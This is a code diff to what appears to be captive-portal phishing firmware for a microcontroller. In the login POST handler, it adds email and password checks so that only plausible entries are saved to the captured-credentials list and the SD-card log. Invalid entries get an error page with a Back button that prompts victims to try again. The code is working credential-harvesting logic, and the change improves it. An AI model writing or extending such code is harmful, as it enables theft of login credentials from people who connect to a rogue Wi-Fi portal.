@@ -232,12 +232,38 @@ String index_GET() {
 String index_POST() {
   String email = getInputValue("email");
   String password = getInputValue("password");
-  capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
+  bool isValid = true;
 
-#if defined(SDCARD)
-  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
-#endif
-  return getHtmlContents(LOGIN_AFTER_MESSAGE);
+  // Email validation
+  int atIndex = email.indexOf('@');
+  int dotIndex = email.lastIndexOf('.');
+  if (atIndex == -1 || dotIndex == -1 || atIndex > dotIndex || dotIndex == email.length() - 1) {
+    isValid = false;
+    email = "Invalid Email";
+  }
+
+  // Password validation
+  if (password.length() < 8) {
+    isValid = false;
+    password = "Password too short";
+  }
+
+  // Only append if valid
+  if (isValid) {
+    capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
+    #if defined(SDCARD)
+      appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
+    #endif
+  } else {
+    capturedCredentialsHtml = "<li>Invalid credentials attempt: <b>Email: " + email + "</b></br><b>Password: " + password + "</b></li>" + capturedCredentialsHtml;
+  }
+
+  // HTML template for "Please wait connecting" or error message with Back button
+  String message = isValid ? LOGIN_AFTER_MESSAGE : "Invalid credentials. Please try again.";
+  return getHtmlContents(
+    "<div style='text-align: center;'><p>" + message + "</p>"
+    "<button onclick=\"window.history.back()\" style='margin-top: 20px;'>Back</button></div>"
+  );
 }
 
 String ssid_GET() {
